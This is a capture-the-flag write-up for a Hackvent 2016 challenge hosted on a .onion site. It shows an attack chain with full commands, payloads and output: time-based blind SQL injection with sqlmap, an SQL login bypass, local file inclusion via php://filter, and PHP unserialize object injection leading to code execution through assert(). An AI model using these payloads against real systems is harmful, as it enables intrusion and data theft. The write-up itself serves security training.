Day 22: Pengus Site
-------------------
Since the website is a .onion we install Tor browser from [1] and install it. Then to be able to test the web site with some comfort we proxy Burp through Tor as explained in [2]. Then we can start serious business :)

There is only one visible page with one form, a sample request to that form would be:
```
POST / HTTP/1.1
Content-Length: 5
Accept-Encoding: gzip,deflate
Connection: close
Accept: */*
User-Agent: sqlmap/1.0.11#stable (http://sqlmap.org)
Host: 7y4b2aymlqwmkyuh.onion
Cookie: PHPSESSID=4e0chtslg9i10l3f1hdd4ee6n3
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded; charset=utf-8

k=foo
```

The response, however, looks to be always the same whichever the input. We fire an active scan through Burp and in the result we see "TRACE method enabled", "Cross-Site Request Forgery" that are both interesting but on top is "SQL Injection" which is way more tempting. When looking closer, we see that the following request has an execution time of > 20 seconds:
```
POST / HTTP/1.1
Host: 7y4b2aymlqwmkyuh.onion
Cookie: PHPSESSID=4e0chtslg9i10l3f1hdd4ee6n3
Connection: close
Content-Length: 48

k=foobar'%2b(select*from(select(sleep(20)))a)%2b'
```

So the form is vulnerable to time-based blind SQL injection. There is a tool that fits perfectly to exploit this kind of vulnerability, please welcome sqlmap! Here is the run of sqlmap to test and find the vulnerability:
```bash
$ sqlmap --proxy=http://127.0.0.1:8080 -u http://7y4b2aymlqwmkyuh.onion --cookie="PHPSESSID=4e0chtslg9i10l3f1hdd4ee6n3" --data="k=foo" --technique T --level 2 --risk 2
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.0.11#stable}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 07:26:12

[07:26:12] [INFO] testing connection to the target URL
[07:26:13] [WARNING] heuristic (basic) test shows that POST parameter 'k' might not be injectable
[07:26:58] [INFO] testing for SQL injection on POST parameter 'k'
[07:26:58] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[07:26:58] [WARNING] time-based comparison requires larger statistical model, please wait............................ (done)
[07:27:25] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[07:27:40] [INFO] POST parameter 'k' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (2) and risk (2) values? [Y/n] 
[07:28:05] [INFO] checking if the injection point on POST parameter 'k' is a false positive
POST parameter 'k' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
---
Parameter: k (POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: k=foo' AND (SELECT * FROM (SELECT(SLEEP(5)))VEyD) AND 'Tsac'='Tsac
---
[07:28:54] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.23, PHP 5.6.28
back-end DBMS: MySQL >= 5.0.12
[07:28:54] [INFO] fetched data logged to text files under '/home/jsmith/.sqlmap/output/7y4b2aymlqwmkyuh.onion'

[*] shutting down at 07:28:54
```

As for the parameters used, the `proxy` setting allows to connect to Tor network through Burp. The `--technique T` forces the use of time-based blind injection technique. To go further we instruct sqlmap to dump the DB list as follows (and this takes forever because it is time-based through Burp through SOCKS proxy through Tor, who said inception?):
```bash
$ sqlmap --proxy=http://127.0.0.1:8080 -u http://7y4b2aymlqwmkyuh.onion --cookie="PHPSESSID=4e0chtslg9i10l3f1hdd4ee6n3" --data="k=foo" --dbs
[CUT BY TROLLI101]
available databases [5]:
[*] information_schema
[*] mysql
[*] pengus_site
[*] performance_schema
[*] test
[CUT BY TROLLI101]
```

Next step is to list the tables in DB pengus_site:
```bash
$ sqlmap --proxy=http://127.0.0.1:8080 -u http://7y4b2aymlqwmkyuh.onion --cookie="PHPSESSID=4e0chtslg9i10l3f1hdd4ee6n3" --data="k=foo" -D pengus_site --tables
[CUT BY TROLLI101]
Database: pengus_site
[1 table]
+-------------+
| secret_keys |
+-------------+
[CUT BY TROLLI101]
```

And then the columns of the table secret_keys:
```bash
$ sqlmap --proxy=http://127.0.0.1:8080 -u http://7y4b2aymlqwmkyuh.onion --cookie="PHPSESSID=4e0chtslg9i10l3f1hdd4ee6n3" --data="k=foo" -D pengus_site -T secret_keys --columns
[CUT BY TROLLI101]
tabase: pengus_site
Table: secret_keys
[1 column]
+------------+--------------+
| Column     | Type         |
+------------+--------------+
| secret_key | varchar(200) |
+------------+--------------+
[CUT BY TROLLI101]
```

Finally we dump the column and get the secret key:
```bash
$ sqlmap --proxy=http://127.0.0.1:8080 -u http://7y4b2aymlqwmkyuh.onion --cookie="PHPSESSID=4e0chtslg9i10l3f1hdd4ee6n3" --data="k=foo" -D pengus_site -T secret_keys -C secret_key --dump
[CUT BY TROLLI101]
Database: pengus_site
Table: secret_keys
[1 entry]
+--------------------------------------------------------------------------------------------------+
| secret_key                                                                                       |
+--------------------------------------------------------------------------------------------------+
| K7WjFm6eaB3TDD5ZjtfxFVAdCQJaRHyphmpDkfvm7JaqP8rWHF6cXPDzRYqZCKw3xyeQrFmVL6n93J2WaL
nQU2efEfZPx2fv |
+--------------------------------------------------------------------------------------------------+
[CUT BY TROLLI101]
```

Which was useles, I was searching too far away. We could use a much simpler injection to login, entering this string in the login field to get logged in: `1' or '1' = '1`

But this was only the first part, fasten your seat belts! With the key we can now log into the website and are greeted by pengu and he is happy to have us as his customer. We now have access to 3 more pages:

- <http://7y4b2aymlqwmkyuh.onion/?p=106a6c241b8797f52e1e77317b96a201> main page, home
- <http://7y4b2aymlqwmkyuh.onion/?p=86024cad1e83101d97359d7351051156> products page
- <http://7y4b2aymlqwmkyuh.onion/?l> logout

We notice that the parameter `p` in the URL is actually a MD5 hash. When cracking both with online service we get two strings, "home" and "products" which makes sense since this is the name of the pages. We can then try some more things, I did a test with lots of file/directories hashed to md5 but only md5(index) gave something. When called, the following page will return ~12MB of data, looking like 255 times the home page.

Then I launched a new Burp scanner on the home page that returns a result about file path manipulation. And indeed, the response with both those URLs is identical:

- <http://7y4b2aymlqwmkyuh.onion/?p=86024cad1e83101d97359d7351051156>
- <http://7y4b2aymlqwmkyuh.onion/?p=./86024cad1e83101d97359d7351051156>
- <http://7y4b2aymlqwmkyuh.onion/?p=foo/../86024cad1e83101d97359d7351051156>
- <http://7y4b2aymlqwmkyuh.onion/?p=../www/86024cad1e83101d97359d7351051156>

So we're probably looking for some kind of include exploit, this is why the md5(index) page returned all this data. PHP code must be executed after the include. The page at [3] helped me to find the solution. We can use the `php://filter` to convert the md5(index) file to base64 and include it as base64 instead of being executed. This will allow us to have a look at the code before it is interpreted. This is done by calling the following URL: <http://7y4b2aymlqwmkyuh.onion/?p=php://filter/convert.base64-encode/resource=6a992d5529f459a44fee58c733255e86>

In the response, a base64 blob is included and we can decode it to get the index.php file. Here is an interesting excerpt:
```php
[CUT BY TROLLI101]
if(isset($_SESSION['k'])) {

  # <a href="?p=">Admin</a>&nbsp;

  echo '
    <a href="?p=106a6c241b8797f52e1e77317b96a201">Home</a>&nbsp;
    <a href="?p=86024cad1e83101d97359d7351051156">Products</a>&nbsp;
    <a href="?l">Logout</a>
    <br /><br />';

  include((isset($_GET['p']) ? $_GET['p'] : '106a6c241b8797f52e1e77317b96a201').'.php');
}
[CUT BY TROLLI101]
```

So actually there should be some admin zone. It must contain PHP code and was not displayed when trying to reach the p=md5(admin). Using the same technique as for the index, we can exfiltrate the admin page using the URL: <http://7y4b2aymlqwmkyuh.onion/?p=php://filter/convert.base64-encode/resource=21232f297a57a5a743894a0e4a801fc3>

When decoding the base64 blob we get the admin.php page:
```php
<?php
  error_reporting(0);

  class AdminPackage {

     public $password;
     public $leetness;

     function check_leetness() {
       if(md5($this->password) == '0e1337') echo '<pre> [+] Is it 1337? -> '.(assert('1337 == '.$this->leetness) ? 'Yes!' : 'Nope!').'</pre>';
     }

     function __construct($password, $leetness) {
       $this->password = $password; $this->leetness = $leetness;
     }
  }

  if(isset($_GET['a'])) {
    $admin_package = unserialize(base64_decode($_GET['a']));
    $admin_package->check_leetness();
  }
?>
```

OK, now third part, we need to exploit the admin page. So if we use some URL like `/?p=21232f297a57a5a743894a0e4a801fc3&a=something` our parameter 'a' will get base64 decoded and unserialized. So we need to craft a payload that is an `AdminPackage` object serialized and base64 encoded. I modified the admin.php page to craft the payload as follows:
```php
?php
  class AdminPackage {

     public $password;
     public $leetness;

     function check_leetness() {
       if(md5($this->password) == '0e1337') echo '<pre> [+] Is it 1337? -> '.(assert('1337 == '.$this->leetness) ? 'Yes!' : 'Nope!').'</pre>';
     }

     function __construct($password, $leetness) {
       $this->password = $password; $this->leetness = $leetness;
     }
  }

  $pack = new AdminPackage(0, 1);
  $exploit = serialize($pack);
  echo $exploit . "\n";
  echo base64_encode($exploit) . "\n";
?>
```

We can then replace the parameters in the code and execute this using PHP to get the payload and send i to the site. When the parameter 'a' object is unserialized, PHP will automatically call the `__construct` function and assign the parameters that we need, `$password` and `$leetness`. Then the `check_leetness()` function will be executed. To go on, we need to pass the condition `if(md5($this->password) == '0e1337')` This is a known problem of PHP comparison and can be solved by finding a value that when hashed with md5 starts with 0e followed only by digits, see [4] for examples. I used the integer 240610708.

Now we can construct a payload using `AdminPackage(240610708, '1337')` to satisfy the `assert()` and submit it to the site with this URL: http://7y4b2aymlqwmkyuh.onion/?p=21232f297a57a5a743894a0e4a801fc3&a=TzoxMjoiQWRtaW5QYWNrY
WdlIjoyOntzOjg6InBhc3N3b3JkIjtpOjI0MDYxMDcwODtzOjg6ImxlZXRuZXNzIjtzOjQ6IjEzMzciO30=

In the bottom of the HTTP response we get this to prove that it worked:
```
<pre> [+] Is it 1337? -> Yes!</pre>
```

We must now find a way to exploit the `assert()`. Again, some literature helps, see [5]. So `alert()` is like `eval()`, that means we can use some PHP function. I tested with `AdminPackage(240610708, 'phpinfo()')` and it worked. So we have PHP code execution, let's do some file listing until we can list the home directory of pengu using `AdminPackage(240610708, 'var_dump(scandir("/home/pengu/"))')` we get:
```html
[CUT by TROLLI101]
<small>/www/21232f297a57a5a743894a0e4a801fc3.php(10) : assert code:1:</small>
<b>array</b> <i>(size=3)</i>
  0 <font color='#888a85'>=&gt;</font> <small>string</small> <font color='#cc0000'>'.'</font> <i>(length=1)</i>
  1 <font color='#888a85'>=&gt;</font> <small>string</small> <font color='#cc0000'>'..'</font> <i>(length=2)</i>
  2 <font color='#888a85'>=&gt;</font> <small>string</small> <font color='#cc0000'>'7b66a8f1be1f9cff0a19aaf28d0e0396'</font> <i>(length=32)</i>
</pre><pre> [+] Is it 1337? -> Nope!</pre>
[CUT BY TROLLI101]
```

And the final payload looks like `AdminPackage(240610708, 'print(file_get_contents("/home/pengu/7b66a8f1be1f9cff0a19aaf28d0e0396"))')` and it will be serialized to:
```
O:12:"AdminPackage":2:{s:8:"password";i:240610708;s:8:"leetness";s:72:
"print(file_get_contents("/home/pengu/7b66a8f1be1f9cff0a19aaf28d0e0396"))";}
```

And then encoded to:
```
TzoxMjoiQWRtaW5QYWNrYWdlIjoyOntzOjg6InBhc3N3b3JkIjtpOjI0MDYxMDcwODtzOjg6
ImxlZXRuZXNzIjtzOjcyOiJwcmludChmaWxlX2dldF9jb250ZW50cygiL2hvbWUvcGVuZ3Uv
N2I2NmE4ZjFiZTFmOWNmZjBhMTlhYWYyOGQwZTAzOTYiKSkiO30=
```

We can then submit this with the URL: http://7y4b2aymlqwmkyuh.onion/?p=21232f297a57a5a743894a0e4a801fc3&a=TzoxMjoiQWRtaW5QYWNrYWdlIjoyOntzOjg6In
Bhc3N3b3JkIjtpOjI0MDYxMDcwODtzOjg6ImxlZXRuZXNzIjtzOjcyOiJwcmludChmaWxlX2dldF9jb25
0ZW50cygiL2hvbWUvcGVuZ3UvN2I2NmE4ZjFiZTFmOWNmZjBhMTlhYWYyOGQwZTAzOTYiKSkiO30=

And in the bottom of the page we get
```
[CUT by TROLLI101]
     - 1337 -
      .___.
     /     \
    | O _ O |
    /  \_/  \  NOOT NOOT
  .' /     \ `.
 / _| PENGU |_ \
(_/ |       | \_)
    \       /
   __\_>-<_/__
  ~;/     \;~

    - HAX -

Loved your good feedback on the HL chat and on twitter.

If you liked this challenge, tweet me: https://twitter.com/muffiniks

Here's again a gift for you: HV16-p3ng-ug0t-pwn3-dr0x-x0rz

Greetz, MuffinX <3
[CUT by TROLLI101]
```

And the flag is:

> HV16-p3ng-ug0t-pwn3-dr0x-x0rz

References:

- \[1\] Tor browser project, <https://www.torproject.org/>
- \[2\] Proxying Burp Suite through Tor, <http://jerrygamblin.com/2015/12/18/proxying-burpsuite-through-tor/>
- \[3\] Using php://filter for local file inclusion, <https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/>
- \[4\] Some Stackoverflow page, <http://stackoverflow.com/questions/22140204/why-md5240610708-is-equal-to-md5qnkcdzo>
- \[5\] Indepth Code Execution in PHP: Part Two, <http://www.rafayhackingarticles.net/2014/09/indepth-code-execution-in-php-part-two.html>
